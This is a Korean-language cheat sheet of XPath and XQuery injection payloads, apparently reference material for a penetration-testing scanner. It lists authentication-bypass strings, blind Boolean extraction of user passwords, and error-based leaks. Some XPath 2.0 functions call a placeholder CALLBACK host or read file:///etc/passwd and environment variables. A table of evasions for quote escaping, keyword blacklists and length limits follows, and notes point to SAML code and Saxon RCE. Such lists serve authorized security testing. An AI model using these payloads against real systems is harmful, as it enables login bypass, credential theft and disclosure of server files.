### 기본 페이로드

**인증 우회** (`AUTH_BYPASS` 라벨):
- `' or '1'='1` (username/password)
- `' or '1'='1' or 'a'='b` (다중 OR)
- `admin' or '1'='1` (username)
- `' or count(parent::*[position()=1])=1 or 'a'='b`
- `'or string-length(name(.))<10 or'` (필터 우회)
- `']%00` (NULL byte 종결, 일부 엔진)
- `' or 1=1 or ''='` (OR 변형)

**JSON body:**
```json
{"username":"admin' or '1'='1","password":"x"}
{"username":"admin","password":"' or '1'='1"}
```

**더블쿼트 컨텍스트:**
- `" or "1"="1` (server uses double quotes)
- `concat('a',"'",'b')` (quote 함수 우회)

**숫자 컨텍스트 (따옴표 불필요):**
- `1 or 1=1` (position()=${idx} 컨텍스트)
- `1 or position()>0`

**데이터 유출:**
- `' or 1=1 or 'a'='b` (모든 노드 매칭)
- `' or count(//user)>0 or 'a'='b` (노드 수 확인)
- `' or //user[name='admin']/password or 'a'='b` (XPath 2.0+ 직접 추출)
- `'/parent::*/child::node()` (트리 walk)

**Blind extraction (Boolean):**
```
# 첫 글자 추출
' or substring(//user[1]/password,1,1)='a' or 'a'='b
' or substring(//user[1]/password,1,1)='b' or 'a'='b

# 길이 확인
' or string-length(//user[1]/password)=8 or 'a'='b
' or string-length(//user[1]/password)>10 or 'a'='b

# 노드 이름 추출 (XPath 1.0)
' or substring(name(/*[1]),1,1)='r' or 'a'='b

# 자식 노드 수
' or count(//user[1]/*)=5 or 'a'='b
```

**XPath 2.0+ 함수** (`XPATH_SSRF` 라벨):
- `' or doc('http://CALLBACK/xpath')//* or 'a'='b` (외부 fetch — lxml/Saxon)
- `' or unparsed-text('file:///etc/passwd') or 'a'='b` (LFI)
- `' or document('https://CALLBACK/x') or 'a'='b` (XSLT 환경)
- `' or fn:doc('https://CALLBACK/x')` (XQuery)

**에러 기반:**
- `'` (단일 따옴표 — XPath syntax 에러 유발)
- `' or error(QName('','x'),//user[1]/password) or 'a'='b` (XPath 2.0)

**XPath 2.0+ 환경 정보 노출:**
- `' or environment-variable('PATH') or 'a'='b`
- `' or system-property('xsl:vendor') or 'a'='b`

**XQuery injection:**
```
declare function local:x() { doc('//etc/passwd') }; local:x()
let $x := doc('http://CALLBACK/x') return $x
```

**Attribute name injection:**
- `//user[@${attr}='value']` — 속성명 자체가 입력이면 다른 속성 매칭
- `//user[@*='admin']` (모든 속성 매칭)

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| 싱글쿼트만 escape | 더블쿼트 컨텍스트 — `" or "1"="1`, `concat('a',"'",'b')` 같은 함수 |
| `'`/`"` 모두 escape | 숫자 컨텍스트 (`position()=${idx}`)에 `1 or 1=1` (따옴표 불필요) |
| 화이트리스트 (영문/숫자) | 인증 필터에 username `*` 단독 — XPath에선 와일드카드 미적용이지만 함수로 대체 |
| XPath 1.0 제한 (함수 차단) | `substring()`, `contains()`, `starts-with()`로 Blind 가능 (1.0 표준 함수) |
| 변수 바인딩 사용 | 다른 sink (검색 필터)가 raw concat이면 우회 |
| 키워드 블랙리스트 (`or`) | 대소문자 (`OR`/`Or`), 공백 변형 (`o\nr`), `union`/`|` (XPath union operator) 사용 |
| 길이 제한 | `'or 1` (5자), `'or'1` (5자) |

**키워드 분할 우회:**
```
'or  ''=''     (공백 2개 — 일부 정규식 우회)
' OR ''='	'  (TAB 삽입)
'/**/or/**/''=''   (주석 — 일부 엔진은 미지원)
```

---

### 참고사항

- XML 기반 인증 시스템 (legacy)에서 가장 흔한 패턴
- SAML assertion 처리 코드에서 XPath 자주 사용 — saml-scanner와 결합
- `lxml.etree.xpath`는 XPath 1.0이지만 Saxon은 2.0+ — 함수 가용성 차이
- `doc()`/`unparsed-text()` 함수는 XPath 2.0+ 환경에서 LFI/SSRF로 직결
- XQuery injection은 별도 — `let $x := ...; declare function ...` 구문 가능 시 코드 실행
- ElementTree (Python stdlib)는 제한적 XPath 지원 — `[predicate]`, 함수 미지원 (XPath 1.0 부분)
- Java JAXP는 setXPathVariableResolver로 변수 바인딩 가능 — 사용 확인
- XPath 1.0과 2.0/3.0의 차이: 1.0은 함수 제한적 (substring/concat 정도), 2.0+는 doc/unparsed-text/error 등 풍부
- 노드 수/길이 추출은 Boolean Blind의 핵심 — 응답 차이만으로 데이터 추출 가능
- 응답이 단일 결과 vs 다중 결과로 분기되는 패턴 (인증 성공 vs 실패) 활용
- Saxon EE 환경에선 Java 바인딩 가능 — 추가 RCE 게이트
- 인증 우회 검증은 다중 시나리오 (admin/일반/존재 안 하는 사용자) 비교
- XPath 1.0에는 string-length/substring/contains/starts-with만 있음 — Blind는 이걸로 충분
- 에러 메시지에 XPath 표현식이 노출되면 query 구조 추론 가능 → 페이로드 정교화
